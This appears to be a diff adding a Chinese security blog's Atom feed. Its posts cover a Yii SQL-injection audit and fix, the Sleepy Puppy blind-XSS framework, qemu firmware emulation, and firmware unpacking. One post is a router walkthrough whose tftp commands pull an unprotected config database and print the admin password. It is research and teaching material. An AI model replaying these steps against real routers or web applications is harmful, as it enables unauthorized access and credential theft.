+                    -&gt;where([<span class="string">"and"</span>,[<span class="string">"="</span>,<span class="string">"user_id"</span>,<span class="variable">$user</span>_id],
+                            [<span class="string">"="</span>,<span class="string">"market_type"</span>,<span class="number">4</span>],
+                            [<span class="string">"&gt;"</span>,<span class="string">"market_id"</span>,<span class="number">0</span>]])
+                    -&gt;all();
+
+        if (!empty(<span class="variable">$cartData</span>)) {
+            foreach (<span class="variable">$cartData</span> as <span class="variable">$v</span>) {
+
+                if (in_array(<span class="variable">$v-</span>&gt;product_id, <span class="variable">$product</span>_ids)) {
+                    <span class="variable">$param</span> = [
+                            <span class="string">'user_id'</span>=&gt;<span class="variable">$user</span>_id,
+                            <span class="string">'goods_id'</span>=&gt;<span class="variable">$v-</span>&gt;goods_id,
+                            <span class="string">'product_id'</span>=&gt;<span class="variable">$v-</span>&gt;product_id,
+                            <span class="string">'num'</span> =&gt;<span class="number">0</span>
+                    ];
+                    \api\MarketApi::model()-&gt;addUserBuyNum(<span class="variable">$param</span>);
+                }
+            }
+        }
+        Carts::deleteAll(<span class="string">"user_id={$user_id} and product_id in({$product_ids})"</span>);
+</code></pre><p>这里可以看到用户输入的数据拼接到了字符串user_id={$user_id} and product_id in({$product_ids})进入了deleteAll方法。这个字符串看起来是一个查询条件。继续跟进deleteAll方法：</p>
+<pre><code>/**
+ * Deletes rows <span class="keyword">in</span> the table using the provided conditions.
+ * WARNING: If you do not specify any condition, this method will <span class="keyword">delete</span> ALL rows <span class="keyword">in</span> the table.
+ *
+ * For example, <span class="keyword">to</span> <span class="keyword">delete</span> all customers whose status is <span class="number">3</span>:
+ *
+ * &lt;!--￼<span class="number">0</span>--&gt;
+
+ *
+ * @param string|<span class="keyword">array</span> <span class="variable">$condition</span> the conditions that will be put <span class="keyword">in</span> the WHERE part <span class="keyword">of</span> the DELETE SQL.
+ * Please refer <span class="keyword">to</span> [[Query::where()]] on how <span class="keyword">to</span> specify this parameter.
+ * @param <span class="keyword">array</span> <span class="variable">$params</span> the parameters (name =&gt; <span class="keyword">value</span>) <span class="keyword">to</span> be bound <span class="keyword">to</span> the query.
+ * @<span class="keyword">return</span> integer the number <span class="keyword">of</span> rows deleted
+ */
+public static <span class="keyword">function</span> deleteAll(<span class="variable">$condition</span> = <span class="string">''</span>, <span class="variable">$params</span> = [])
+{
+    <span class="variable">$command</span> = static::getDb()-&gt;createCommand();
+    <span class="variable">$command-</span>&gt;delete(static::tableName(), <span class="variable">$condition</span>, <span class="variable">$params</span>);
+    //表更新成功时，记录表最后更新时间
+    if(<span class="variable">$command-</span>&gt;execute()){
+        \Yii::<span class="variable">$app-</span>&gt;cache-&gt;set(static::tableName(), time());
+        return true;
+    }
+    return false;
+}
+</code></pre><p>从deleteAll的英文注释看起来，这应该是一个通用的方法。用来删除数据库中的数据。下一步就是确认deleteAll方法是否有做防SQL注入的转义。deleteAll使用了createCommand()。查询Yii 2.0 api文档得知。<a href="http://www.yiiframework.com/doc-2.0/yii-db-command.html" target="_blank" rel="external">Class yii\db\Command</a>可以直接数据库中执行任意SQL语句。比如：</p>
+<pre><code><span class="variable">$users</span> = <span class="variable">$connection-</span>&gt;createCommand(<span class="string">'SELECT * FROM user'</span>)-&gt;queryAll();
+</code></pre><p>该类的delete方法接受3个参数：<br><img src="/images/yiisqli1.png" alt=""><br>可知，delete方法本身提供参数化的方法，可以避免SQL注入。示例为：</p>
+<pre><code>$user=<span class="attribute">Yii</span>::app<span class="function"><span class="params">()</span>-&gt;</span>db-&gt;createCommand<span class="function"><span class="params">()</span>
+-&gt;</span><span class="keyword">delete</span>(<span class="string">'tbl_user'</span>, <span class="string">'user_id=:id'</span>, array(<span class="string">':id'</span>=&gt;<span class="number">2</span>));
+</code></pre><p>这里用户输入直接拼接到了$condition里，而condition是Where的条件。可以有两种类型，字符串或者数组。关于Yii如何处理$condition可以参考<a href="http://www.yiiframework.com/doc-2.0/yii-db-query.html#where(" target="_blank" rel="external">api手册</a>-detail).condition为字符串时，直接作为where的条件进入SQL语句。因为这里把用户输入放到了condition字符串中，所以导致了SQL注入。</p>
+<p>#代码修复方案<br>Yii处理$condition的<a href="http://www.yiiframework.com/doc-2.0/yii-db-query.html#where(" target="_blank" rel="external">api手册</a>-detail)中可以得知，conditon为数组的时候有两种形式：</p>
+<pre><code>The <span class="variable">$condition</span> parameter should be either a string (e.g. <span class="string">'id=1'</span>) or an <span class="keyword">array</span>.
+The <span class="variable">$condition</span> specified <span class="keyword">as</span> an <span class="keyword">array</span> can be <span class="keyword">in</span> one <span class="keyword">of</span> the following two formats:
+hash format: [<span class="string">'column1'</span> =&gt; value1, <span class="string">'column2'</span> =&gt; value2, ...]
+operator format: [operator, operand1, operand2, ...]
+</code></pre><p>而条件为in的时候：</p>
+<pre><code><span class="keyword">in</span>: operand <span class="number">1</span> should be a column <span class="keyword">or</span> DB expression, <span class="keyword">and</span> operand <span class="number">2</span> be an <span class="keyword">array</span> representing the range <span class="keyword">of</span> the values that the column <span class="keyword">or</span> DB expression should be <span class="keyword">in</span>. <span class="keyword">For</span> example, [<span class="string">'in'</span>, <span class="string">'id'</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]] will generate id <span class="keyword">IN</span> (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>). The <span class="function"><span class="keyword">method</span> <span class="title">will</span> <span class="title">properly</span> <span class="title">quote</span> <span class="title">the</span> <span class="title">column</span> <span class="title">name</span> <span class="title">and</span> <span class="title">escape</span> <span class="title">values</span> <span class="title">in</span> <span class="title">the</span> <span class="title">range</span>.
+
+<span class="title">and</span>:</span> the operands should be concatenated together <span class="keyword">using</span> <span class="keyword">AND</span>. <span class="keyword">For</span> example, [<span class="string">'and'</span>, <span class="string">'id=1'</span>, <span class="string">'id=2'</span>] will generate id=<span class="number">1</span> <span class="keyword">AND</span> id=<span class="number">2</span>. <span class="keyword">If</span> an operand <span class="keyword">is</span> an <span class="keyword">array</span>, it will be converted <span class="keyword">into</span> a string <span class="keyword">using</span> the rules described here. <span class="keyword">For</span> example, [<span class="string">'and'</span>, <span class="string">'type=1'</span>, [<span class="string">'or'</span>, <span class="string">'id=1'</span>, <span class="string">'id=2'</span>]] will generate <span class="keyword">type</span>=<span class="number">1</span> <span class="keyword">AND</span> (id=<span class="number">1</span> <span class="keyword">OR</span> id=<span class="number">2</span>). The <span class="function"><span class="keyword">method</span> <span class="title">will</span> <span class="title">not</span> <span class="title">do</span> <span class="title">any</span> <span class="title">quoting</span> <span class="title">or</span> <span class="title">escaping</span>.</span>
+</code></pre><p>使用in的时候会自动转义，这样也就避免的SQL注入，所以这里使用数组形式就可以避免SQL注入。但是这里貌似也有个坑就是使用and的时候，手册写到The method will not do any quoting or escaping。这样的话使用and，即使使用数组传递参数，如果参数中拼接了用户输入，也可能存在SQL注入。这样的话如果需要使用command类是执行sql，如果and条件中有用户可控数据，就需要使用参数绑定来避免sql注入。</p>
+<p>查找代码中所有condition中使用了字符串方式，并且字符串中拼接了用户输入的代码，排查该类型编码缺陷导致的SQL注入漏洞。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>#漏洞发现过程<br>黑盒测试发现。使用工具burpsuite。当在购物车中删除商品时，发送数据包如下：</p>
+<pre><code>POST /cart/miniDel.html HTTP/<span class="number">1.1</span>
+id=<span]]>
+    </summary>
+    
+      <category term="Yii" scheme="http://stayliv3.github.io/tags/Yii/"/>
+    
+      <category term="代码审计" scheme="http://stayliv3.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[xss工具sleep puppy手册]]></title>
+    <link href="http://stayliv3.github.io/2015/10/20/xss%E5%B7%A5%E5%85%B7sleep-puppy%E6%89%8B%E5%86%8C/"/>
+    <id>http://stayliv3.github.io/2015/10/20/xss工具sleep-puppy手册/</id>
+    <published>2015-10-20T08:07:54.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p><a href="https://github.com/Netflix/sleepy-puppy" target="_blank" rel="external">sleep puppy</a>是owasp出品的一个XSS工具，官方描述是Sleep Puppy是一个XSS payload管理框架，可以长期的管理，跟踪XSS的传播。</p>
+<p>跟国内的xssme一样，定位于xss的利用和盲打。老外特地提到了盲打这个场景，只是他们换了一个说法，貌似blind xss在英语中有歧义，所以他们使用了Delayed XSS Testing这个词。认为delayed xss是存储型XSS的一个变种，是说安全测试插入的XSS payload通过数据传递在另外一个不同的应用中触发。<br><img src="/images/sleeppuppy1.png" alt=""></p>
+<p>#安装<br>这里使用docker测试，优点是快速方便，缺点是不支持TLS，存在默认密码。按照<a href="https://github.com/netflix/sleepy-puppy/wiki/docker" target="_blank" rel="external">官方指南安装</a>。</p>
+<p>#主要功能模块</p>
+<p>assessments用来描述不同的测试会话，相当于xssme的项目。不同的项目可以分别设置不同的提醒邮件之类的。</p>
+<p>payload用来管理不同的XSS payload，默认有七个。<br><img src="/images/sleeppuppy2.png" alt=""></p>
+<p>PuppyScripts 管理victim上执行的js代码。默认的js脚本可以获取访问页面的dom树和页面截图，这个还是比较不错的。<br>当然也可以自定义收集的信息，使用generic collector。</p>
+<p>capture是payload被触发，接收到的数据的地方。<br><img src="/images/sleeppuppy3.png" alt=""></p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p><a href="https://github.com/Netflix/sleepy-puppy" target="_blank" rel="external">sleep puppy</a>是owasp出品的一个XSS工具，官方描述是Sleep Puppy是一个XSS p]]>
+    </summary>
+    
+      <category term="黑盒测试" scheme="http://stayliv3.github.io/categories/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[part5 通过qemu和ida远程调试设备固件]]></title>
+    <link href="http://stayliv3.github.io/2015/09/06/part5-%E9%80%9A%E8%BF%87qemu%E5%92%8Cida%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6/"/>
+    <id>http://stayliv3.github.io/2015/09/06/part5-通过qemu和ida远程调试设备固件/</id>
+    <published>2015-09-06T07:18:15.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>上一篇讲到通过静态分析发现SQL注入漏洞。很多情况下动态分析会方便调试复杂的应用。所以这一篇中会讨论使用qemu和ida搭建动态调试环境的内容。</p>
+<p>我们的目标程序TEW-654TR是小端的MIPS程序，所以要想在我们的主机上执行这个二进制程序的话需要使用模拟器。qemu就是一款优秀的模拟器，可以支持多种处理器架构。可以模拟运行整个系统，可以运行独立的可执行文件。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>上一篇讲到通过静态分析发现SQL注入漏洞。很多情况下动态分析会方便调试复杂的应用。所以这一篇中会讨论使用qemu和ida搭建动态调试环境的内容。</p>
+<p>我们的目标程序TEW-654TR是小端的MIPS程序，所以要想在我们的主机上执行这个二进制程序的话需要使用模拟器。]]>
+    </summary>
+    
+      <category term="qemu" scheme="http://stayliv3.github.io/tags/qemu/"/>
+    
+      <category term="万物互联" scheme="http://stayliv3.github.io/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[逆向路由器固件之四 qemu仿真环境运行固件应用]]></title>
+    <link href="http://stayliv3.github.io/2015/09/01/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E5%9B%9B-qemu%E4%BB%BF%E7%9C%9F%E7%8E%AF%E5%A2%83%E8%BF%90%E8%A1%8C%E5%9B%BA%E4%BB%B6%E5%BA%94%E7%94%A8/"/>
+    <id>http://stayliv3.github.io/2015/09/01/逆向路由器固件之四-qemu仿真环境运行固件应用/</id>
+    <published>2015-09-01T02:43:28.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>#qemu安装</p>
+<p>mac编译安装遇到错误。</p>
+<pre><code>➜  qemu git:(master) ./configure <span class="comment">--static</span>
+C++ compiler c++ <span class="keyword">does</span> <span class="keyword">not</span> work <span class="keyword">with</span> C compiler cc
+Disabling C++ specific optional code
+ERROR: Your compiler <span class="keyword">does</span> <span class="keyword">not</span> support <span class="keyword">the</span> __thread specifier <span class="keyword">for</span>
+       Thread-Local Storage (TLS). Please upgrade <span class="keyword">to</span> a <span class="property">version</span> <span class="keyword">that</span> <span class="keyword">does</span>.
+</code></pre><p>Google说是gcc版本低的原因。需要gcc 4.3以上。看了一下自己的版本。</p>
+<pre><code>➜  blog  gcc --version
+Configured with: --prefix=/Applications/Xcode.app/Contents/Developer/usr --with-gxx-include-dir=/usr/include/c++/<span class="number">4.2</span><span class="number">.1</span>
+Apple LLVM version <span class="number">6.1</span><span class="number">.0</span> (clang-<span class="number">602.0</span><span class="number">.53</span>) (based on LLVM <span class="number">3.6</span><span class="number">.0</span>svn)
+Target: x86_64-apple-darwin14<span class="number">.1</span><span class="number">.0</span>
+Thread model: posix
+</code></pre>]]></content>
+    <summary type="html">
+    <![CDATA[<p>#qemu安装</p>
+<p>mac编译安装遇到错误。</p>
+<pre><code>➜  qemu git:(master) ./configure <span class="comment">--static</span>
+C++ compiler c++ <span ]]>
+    </summary>
+    
+      <category term="qemu" scheme="http://stayliv3.github.io/tags/qemu/"/>
+    
+      <category term="万物互联" scheme="http://stayliv3.github.io/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[逆向路由器固件之二]]></title>
+    <link href="http://stayliv3.github.io/2015/08/24/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E4%BA%8C/"/>
+    <id>http://stayliv3.github.io/2015/08/24/逆向路由器固件之二/</id>
+    <published>2015-08-24T12:11:13.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p><a href="http://localhost:4000/2015/08/24/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E8%A7%A3%E5%8C%85/" target="_blank" rel="external">之前的文章中</a>详细介绍了各种解包路由器固件的工具。解包之后就获得了固件中的文件。下一步就是分析文件寻找漏洞了。这次分析的目标是Trendnet路由器，分析的漏洞是一个远程获取路由器权限的漏洞。<br><img src="/images/trendnet1.png" alt=""></p>
+<p>通过路由器的登录界面得知路由器型号为Trendnet TEW-654TR,这对收集目标的信息是很有帮助的。通过<a href="http://www.trendnet.com/products/proddetail.asp?prod=175_TEW-654TR&amp;cat=41" target="_blank" rel="external">官方介绍</a>得知该路由器的一些特性。包括支持路由器，无线接入点，无线接入点客户端三种模式，支持NAT和有状态的包检查防御攻击以及有一个简单的web界面支持远程管理等。官网目前最新版固件为V1.10B26。本文中分析的固件版本为V1.10B12,可以从<a href="http://download.trendnet.com/TEW-654TR/firmware/" target="_blank" rel="external">这里下载</a>。</p>
+<p>为了方便就不适用file等工具进行信息收集了。直接使用binwalk查看bin文件信息，可以看到是比较标准的基于linux的文件系统。</p>
+<p><img src="/images/trendnet2.png" alt=""></p>
+<p>使用Firmware Mod Kit直接自动解包成功：</p>
+<p><img src="/images/trendnet3.png" alt=""></p>
+<p>解包成功之后第一件事情就是看一下etc目录配置文件和启动脚本。</p>
+<pre><code>  etc git:(master) ✗ ls -al
+total <span class="number">32</span>
+drwxrwxrwx   <span class="number">7</span> root  wheel   <span class="number">238</span>  <span class="number">5</span> <span class="number">30</span>  <span class="number">2011</span> .
+drwxrwxrwx  <span class="number">17</span> root  wheel   <span class="number">578</span>  <span class="number">5</span> <span class="number">30</span>  <span class="number">2011</span> ..
+-rwxrwxrwx   <span class="number">1</span> root  wheel   <span class="number">230</span> <span class="number">11</span> <span class="number">10</span>  <span class="number">2008</span> fstab
+-rwxr-xr-x   <span class="number">1</span> root  wheel  <span class="number">3774</span>  <span class="number">5</span> <span class="number">30</span>  <span class="number">2011</span> icon.ico
+-rwxrwxrwx   <span class="number">1</span> root  wheel   <span class="number">109</span> <span class="number">11</span> <span class="number">10</span>  <span class="number">2008</span> inittab
+drwxrwxrwx   <span class="number">3</span> root  wheel   <span class="number">102</span>  <span class="number">3</span> <span class="number">23</span>  <span class="number">2010</span> rc.d
+lrwxrwxrwx   <span class="number">1</span> root  wheel    <span class="number">22</span>  <span class="number">8</span> <span class="number">24</span> <span class="number">19</span>:<span class="number">37</span> resolv.conf -&gt; ../var/etc/resolv.conf
+</code></pre><p>并没有发现有价值的配置文件，但是rc.d目录下有一个叫rcS的启动脚本。</p>
+<pre><code>➜  etc git:(master) ✗ cd rc.d
+➜  rc.d git:(master) ✗ ls -al
+total <span class="number">8</span>
+drwxrwxrwx  <span class="number">3</span> root  wheel  <span class="number">102</span>  <span class="number">3</span> <span class="number">23</span>  <span class="number">2010</span> .
+drwxrwxrwx  <span class="number">7</span> root  wheel  <span class="number">238</span>  <span class="number">5</span> <span class="number">30</span>  <span class="number">2011</span> ..
+-rwxrwxrwx  <span class="number">1</span> root  wheel  <span class="number">768</span>  <span class="number">3</span> <span class="number">23</span>  <span class="number">2010</span> rcS
+</code></pre><p>rcS通常是在启动的时候初始化服务和环境，所以值得仔细看一下。</p>
+<pre><code>➜  rc.d <span class="symbol">git:</span>(master) ✗ cat rcS
+<span class="comment">#!/bin/ash</span>
+<span class="comment"># This script runs when init it run during the boot process.</span>
+<span class="comment"># Mounts everything in the fstab</span>
+mount -a
+mount -o remount +w /
+<span class="comment"># Mount the RAM filesystem to /tmp</span>
+mount -t tmpfs tmpfs /tmp
+<span class="comment"># copy all files in the mnt folder to the etc folder</span>
+cp -a /mnt/* <span class="regexp">/etc
+mkdir -p /var</span><span class="regexp">/etc
+mkdir -p /var</span><span class="regexp">/firm
+mkdir -p /var</span><span class="regexp">/log
+mkdir -p /var</span><span class="regexp">/misc
+mkdir -p /var</span><span class="regexp">/run
+mkdir -p /var</span><span class="regexp">/sbin
+mkdir -p /var</span><span class="regexp">/tmp
+mkdir -p /tmp</span><span class="regexp">/var
+cp -f /etc</span><span class="regexp">/udhcpd.conf /var</span><span class="regexp">/etc/</span>
+cp -f /etc/udhcpd.leases /var/misc/
+<span class="comment">#Add link for resolv.conf</span>
+<span class="comment">#ln -sf /var/etc/resolv.conf /etc/resolv.conf</span>
+<span class="comment"># Load configure file from Flash</span>
+/bin/echo <span class="string">"Init System..."</span>
+system_manager &amp;
+<span class="comment"># Start tftpd</span>
+/bin/echo <span class="string">"Start Tftpd..."</span>
+tftpd &amp;
+<span class="comment">#insert cc_dev module for reset packet counter</span>
+insmod /<span class="class"><span class="keyword">lib</span>/<span class="title">modules</span>/<span class="title">cc_dev</span>.<span class="title">ko</span></span>
+</code></pre><p>脚本比较简单，先建立一些目录，然后启动了system_manager和tftp，最后加载了一个内核模块。system_namager不知道是啥，先看下tftp吧。</p>
+<pre><code>eve<span class="variable">@eve</span><span class="symbol">:/opt/firmware-mod-kit/trunk/fmk/rootfs</span><span class="variable">$ </span>find -name tftpd
+./sbin/tftpd
+eve<span class="variable">@eve</span><span class="symbol">:/opt/firmware-mod-kit/trunk/fmk/rootfs</span><span class="variable">$ </span>file ./sbin/tftpd 
+./sbin/<span class="symbol">tftpd:</span> <span class="constant">ELF </span><span class="number">32</span>-bit <span class="constant">LSB </span>executable, <span class="constant">MIPS,</span> <span class="constant">MIPS-II </span>version <span class="number">1</span> (<span class="constant">SYSV)</span>, dynamically linked (uses shared libs), stripped
+eve<span class="variable">@eve</span><span class="symbol">:/opt/firmware-mod-kit/trunk/fmk/rootfs</span><span class="variable">$ </span>strings ./sbin/tftpd 
+/lib/ld-uClibc.so.<span class="number">0</span>
+p ,<span class="constant">D</span>
+<span class="constant">_init</span>
+<span class="constant">_fini</span>
+<span class="constant">__uClibc_main.</span>......
+</code></pre><p>通过函数名和一些字符串，感觉像是一个可以直连的tftp server。尝试连接一下试试看。</p>
+<pre><code>eve@eve:~$ tftp <span class="number">1.1</span><span class="number">.1</span><span class="number">.102</span>
+tftp&gt; get /var/etc/udhcpd.conf
+Received <span class="number">615</span> bytes in <span class="number">0.0</span> seconds
+tftp&gt; quit
+eve@eve:~$ cat udhcpd.conf 
+<span class="preprocessor"># Sample udhcpd configuration file (/etc/udhcpd.conf)</span>
+
+<span class="preprocessor"># The location of the leases file</span>
+lease_file  /var/misc/udhcpd.leases
+
+<span class="preprocessor"># The location of the pid file</span>
+pidfile /var/run/udhcpd.pid
+
+<span class="preprocessor"># Everytime udhcpd writes a leases file, the below script will be called.</span>
+<span class="preprocessor"># Useful for writing the lease file to flash every few hours.</span>
+notify_file dumpleases  <span class="preprocessor"># &lt;--- useful for debugging</span>
+
+<span class="preprocessor"># The following settings are added by system_manager</span>
+
+interface br0
+opt router <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>
+option subnet <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>
+option domain 
+start <span class="number">192.168</span><span class="number">.10</span><span class="number">.101</span>
+end <span class="number">192.168</span><span class="number">.10</span><span class="number">.199</span>
+option lease <span class="number">604800</span>
+static_lease    <span class="number">00</span>:<span class="number">14</span>:d1:b6:<span class="number">02</span>:<span class="number">86</span>   <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>
+</code></pre><p>发现tftp服务是运行的而且可以直接连接。下一步就是找一下哪里存有敏感信息了。通过rcS文件中的注释中可以知道system_manager这个程序可以从flash中加载配置文件。如果system_manager把配置文件写入到了临时目录或者虚拟内存盘中，那么我们就可以直接下载配置文件了。查找一下system_manager中使用的文件路径：</p>
+<pre><code>eve<span class="variable">@eve</span><span class="symbol">:/opt/firmware-mod-kit/trunk/fmk/rootfs</span><span class="variable">$ </span>strings ./usr/bin/system_manager | grep <span class="string">'/'</span>
+/lib/ld-uClibc.so.<span class="number">0</span>
+/etc/default_rt.db
+/etc/rt.db
+/etc/default_ap.db
+/etc/ap.db
+/etc/default_apc.db
+/etc/apc.db
+ln -sf /var/etc/resolv.conf /etc/resolv.conf
+/etc/scripts/config-vlan.sh <span class="number">2</span> <span class="number">0</span>
+tar -zxf /etc/www.tgz......
+</code></pre><p>db后缀的几个文件引起了我的注意，每一个文件都有一个文件名添加了default的备份文件。几乎所有的路由器都有恢复默认配置的功能，所以他们一定会把默认的配置存在某个地方。如果这些db文件是路由器的配置文件就有点说的通了。</p>
+<p>但是哪个文件存储了敏感的密码之类的信息呢。当然可以三个都下载下来看一下。想到最开始查看产品信息的时候有说到，这款路由器支持3种模式：route，access point，access point client。这里的3个db看起来刚好对应三种模式的配置。既然我们测试的这个目标开启了远程web管理，应该是route模式，所以先下载rt.db看看。</p>
+<pre><code>eve@eve:~$ tftp <span class="number">1.1</span>.<span class="number">1.102</span>
+tftp&gt; binary
+tftp&gt; get /etc/rt<span class="class">.db</span>
+Received <span class="number">49152</span> bytes <span class="keyword">in</span> <span class="number">0.1</span> seconds
+tftp&gt; quit
+eve@eve:~$ file rt<span class="class">.db</span> 
+rt<span class="class">.db</span>: SQLite <span class="number">3</span><span class="class">.x</span> database
+</code></pre><p>sqlite数据库。看一下里面的数据。</p>
+<pre><code>eve<span class="constant">@eve</span>:~$ sqlite3 rt.db
+SQLite version <span class="number">3.6</span><span class="number">.22</span>
+Enter <span class="string">".help"</span> <span class="keyword">for</span> instructions
+Enter SQL statements terminated <span class="keyword">with</span> a <span class="string">";"</span>
+sqlite&gt; .tables
+advanced_network      restore_default       wan_static          
+daylight_saving       smtp_settings         website_filter      
+db_version            special_application   website_filter_mode 
+dhcp_server           static_routing        wireless_advanced   
+dmz                   syslog                wireless_basic      
+dynamic_dns           time                  wireless_filter     
+dynamic_routing       user                  wireless_filter_mode
+ip_filter             virtual_server        wireless_security   
+lan_settings          wan_dhcp              wireless_wps        
+log_setting           wan_l2tp              wizard_setting      
+message               wan_pppoe             wpa_settings        
+nat_filter            wan_pptp            
+remote_management     wan_settings        
+sqlite&gt; .schema user
+CREATE TABLE <span class="string">"user"</span> (<span class="string">"user_name"</span> VARCHAR <span class="keyword">DEFAULT</span> <span class="string">''</span>, <span class="string">"user_pwd"</span> VARCHAR <span class="keyword">DEFAULT</span> <span class="string">''</span>, <span class="string">"level"</span> CHAR <span class="keyword">DEFAULT</span> <span class="string">''</span>)<span class="comment">;</span>
+sqlite&gt; <span class="keyword">select</span> * from user<span class="comment">;</span>
+admin|asecretpassword|<span class="number">1</span>
+user|asecretpassword|<span class="number">0</span>
+sqlite&gt;
+</code></pre><p>可以直接查询到登陆密码。使用数据库中的密码成功登陆。<br><img src="/images/trendnet4.png" alt=""></p>
+<p>通过一些简单的分析，我们找到了一个远程利用的漏洞。欢迎来到嵌入式安全的世界~当然这个漏洞看起来有点挫。下一篇会继续一些一些更有意思的漏洞。</p>
+<p>在最新版的固件中，厂商直接禁用掉了tftp的功能来解决这个问题。</p>
+<pre><code><span class="comment"># Load configure file from Flash</span>
+/bin/echo <span class="string">"Init System..."</span>
+system_manager &amp;
+
+<span class="comment"># Start tftpd</span>
+<span class="comment">#/bin/echo "Start Tftpd..."</span>
+<span class="comment">#tftpd &amp;</span>
+
+<span class="comment">#insert cc_dev module for reset packet counter</span>
+insmod /<span class="class"><span class="keyword">lib</span>/<span class="title">modules</span>/<span class="title">cc_dev</span>.<span class="title">ko</span></span>
+</code></pre>]]></content>
+    <summary type="html">
+    <![CDATA[<p><a href="http://localhost:4000/2015/08/24/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E8%A7%A3%E5%8C%85/" ta]]>
+    </summary>
+    
+      <category term="固件" scheme="http://stayliv3.github.io/tags/%E5%9B%BA%E4%BB%B6/"/>
+    
+      <category term="万物互联" scheme="http://stayliv3.github.io/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
+    
+  </entry>
+  
+  <entry>
+    <title><![CDATA[逆向路由器固件之解包]]></title>
+    <link href="http://stayliv3.github.io/2015/08/24/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E8%A7%A3%E5%8C%85/"/>
+    <id>http://stayliv3.github.io/2015/08/24/逆向路由器固件之解包/</id>
+    <published>2015-08-24T03:31:54.000Z</published>
+    <updated>2015-11-24T03:27:38.000Z</updated>
+    <content type="html"><![CDATA[<p>这个系列的文章以逆向路由器固件的方式来挖掘路由器中存在的漏洞。本篇文章主要以介绍解包固件工具为主。文中演示用的固件可以在这里<a href="http://www.tp-link.com/resources/software/TL-WR841N_V8_130506.zip" target="_blank" rel="external">下载</a>。由于针对设备的攻击越来越多，很多厂商把不提供固件下载作为一种安全策略。所有有些时候只能通过物理的方式从设备中导出固件。后续的文章中会介绍相关技术。</p>
+<p>##通用的linux RE工具</p>
+<p><a href="http://linux.die.net/man/1/file" target="_blank" rel="external">file</a> — 用来检测是否是有效的文件和文件类型<br><a href="http://www.freebsd.org/cgi/man.cgi?query=hexdump&amp;sektion=1" target="_blank" rel="external">hexdump</a> —16进制导出工具<br><a href="http://unixhelp.ed.ac.uk/CGI/man-cgi?strings" target="_blank" rel="external">strings</a> 跟hexdump类似但是可以以可读的形式展示<br><a href="http://linux.die.net/man/1/dd" target="_blank" rel="external">dd</a> — 从二进制文件中挖掘数据<br><a href="http://www.manpagez.com/man/1/lzma/" target="_blank" rel="external">lzma</a> — 解压LZMA文件</p>
+<p>##第三方工具</p>
+<p><a href="http://binwalk.org/" target="_blank" rel="external">binwalk</a> — 通过固件文件头来分析文件和文件系统<br><a href="https://code.google.com/p/firmware-mod-kit/" target="_blank" rel="external">Fireware Mod Kit</a> — 自动化分析固件文件的一系列脚本<br><a href="http://www.tldp.org/HOWTO/SquashFS-HOWTO/mksqoverview.html" target="_blank" rel="external">squashfs-tools</a> — 可以通过apt-get squashfs-tools 来安装。用来处理squashfs的一系列工具</p>
+<p>##初步分析</p>
+<p>通常来说逆向工程的第一步就是使用上面列出的通用linux工具从要分析的文件中挖掘出尽量多的信息。通过这些信息来决定下一步进行的分析。比如使用hexdump发现sqsh意味着文件中有一个squashfs文件系统或者识别出了固件包中常用的boot loader U-Boot。</p>
+<p>#File Tool</p>
+<p>文件工具通常只是告诉我们这个文件是否是已知的文件类型，某些情况下可以识别出文件的种类，比如数据文件。</p>
+<p>使用file分析路由器固件如下：<br><img src="/images/Filetool.png" alt=""><br>file分析的结果可以告诉我们该文件是否是已知的类型，是否需要进一步分析。这里的结果我们可以看到仅仅是显示数据文件。</p>
+<p>#hexdump</p>
+<p>hexdump 工具可以让你分析文件中的每一个字节，这是非常有价值的。使用hexdump分析固件如下：</p>
+<p>上面的命令会把hexdump的结果写入到文件hexTP.txt中做进一步分析。-C选项是设置hexdump输出为hex+ASCII的方式，更便于阅读。输出的文件十分巨大，这个例子中我们可以从文件头的地方看到这个固件是属于TP-Link的，但是这个信息我们已经知道了。所以下一步就是尝试strings命令，看看是否可以获得更多的信息。<br><img src="/images/Hexdump.png" alt=""></p>
+<p>#strings</p>
+<p>作为初始的信息收集，strings可能是最常用和做好用的工具之一，因为它可以显示文件中所有可打印的数据。跟使用hexdump一样，最好把strings的结果写入文件分析，以免下次想要分析的时候还需要重复一遍strings命令。<br><img src="/images/stringsuboot.png" alt=""><br>从strings的结果中，我们发现了一些有趣的信息。</p>
